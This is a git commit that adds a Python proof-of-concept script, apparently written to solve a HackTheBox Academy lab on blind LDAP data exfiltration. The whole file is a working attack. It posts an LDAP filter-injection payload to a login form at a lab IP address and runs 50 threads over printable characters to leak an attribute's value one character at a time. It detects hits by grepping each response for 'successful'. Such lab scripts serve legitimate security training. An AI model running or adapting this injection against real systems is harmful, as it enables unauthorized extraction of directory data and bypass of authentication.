cad6985351a8810c5b114989c9fb1d327887015e
Adam Rose <93153300+AdamRose1@users.noreply.github.com>
2024-07-18 07:54:36 -0400

    Create LDAP_Injection_Blind.py

---
+++ HTBAcademy: POC-Scripts/LDAP_Injection_Blind.py
@@ -0,0 +1,42 @@
+#!/usr/bin/env python3
+# Created this script to solve the HackTheBox Academy lab called 'LDAP - Data Exfiltration & Blind Exploitation'
+# This script performs a Blind LDAP Injection Attack on the target 
+
+import requests
+import string
+import subprocess
+import concurrent.futures
+
+# create character list
+def charlist():
+    chars= list(string.printable)
+    return chars
+
+def ldap_injection(char):
+    url="94.237.59.63:32716" # update url
+    proxies={"http":"http://127.0.0.1:8080"}
+    headers={"Content-type":"application/x-www-form-urlencoded"}
+    session= requests.Session()
+    data=f"username=admin)(|(description=h{char}*&password=test)"
+    response= session.post(url=f"http://{url}/index.php", proxies=proxies, allow_redirects=True, headers=headers, data=data)
+    
+    process= subprocess.Popen("grep -i successful", shell=True, text=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    output, errors= process.communicate(input=response.text)
+    if output:
+        return char
+    else:
+        return None
+    
+try:
+    chars = charlist()
+    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+        future_to_test = {executor.submit(ldap_injection,char): (char) for char in chars}
+        for future in concurrent.futures.as_completed(future_to_test):
+            char = future_to_test[future]
+            result = future.result()
+            if result is not None:
+                print(f"Found char: {result}")                                    
+            else:
+                pass
+except KeyboardInterrupt:
+    print("ctrl + c detected, exiting gracefully")
